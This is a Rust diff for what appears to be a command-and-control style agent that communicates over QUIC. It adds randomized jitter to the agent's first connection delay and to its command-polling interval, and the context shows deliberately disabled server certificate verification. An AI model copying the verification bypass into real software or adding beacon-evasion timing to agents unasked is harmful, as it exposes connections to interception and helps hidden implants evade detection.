@@ -660,6 +660,18 @@ impl rustls::client::danger::ServerCertVerifier for SkipServerVerification {
     }
 }
 
+fn calculate_interval_with_jitter(base: u64, jitter: u64) -> u64 {
+    if jitter == 0 {
+        return base;
+    }
+
+    let mut rng = rand::thread_rng();
+    let jitter_amount = rng.gen_range(0..=(jitter * 2)) as i64 - jitter as i64;
+    let interval = base as i64 + jitter_amount;
+
+    interval.max(1) as u64
+}
+
 async fn create_quic_endpoint() -> Result<Endpoint, Box<dyn std::error::Error>> {
     let mut client_crypto = rustls::ClientConfig::builder()
         .dangerous()
@@ -682,14 +694,20 @@ async fn create_quic_endpoint() -> Result<Endpoint, Box<dyn std::error::Error>> 
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let state = AgentState::new();
 
+    // Wait with jitter before initial connection attempt
+    if state.jitter_seconds > 0 {
+        let initial_jitter = rand::thread_rng().gen_range(0..=state.jitter_seconds);
+        tokio::time::sleep(Duration::from_secs(initial_jitter)).await;
+    }
+
     let endpoint = create_quic_endpoint().await?;
 
-    // Registration loop
+    // Registration loop with retry
     loop {
         if register_agent(&endpoint, &state).await.is_ok() {
             break;
         }
-        tokio::time::sleep(Duration::from_secs(RECONNECT_INTERVAL)).await;
+        tokio::time::sleep(Duration::from_secs(state.reconnect_interval)).await;
     }
 
     // Main command loop
@@ -697,7 +715,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     loop {
         let interval = {
             let state_guard = state.lock().await;
-            state_guard.reconnect_interval + rand::thread_rng().gen_range(0..=state_guard.jitter_seconds)
+            calculate_interval_with_jitter(
+                state_guard.reconnect_interval,
+                state_guard.jitter_seconds,
+            )
         };
 
         tokio::time::sleep(Duration::from_secs(interval)).await;
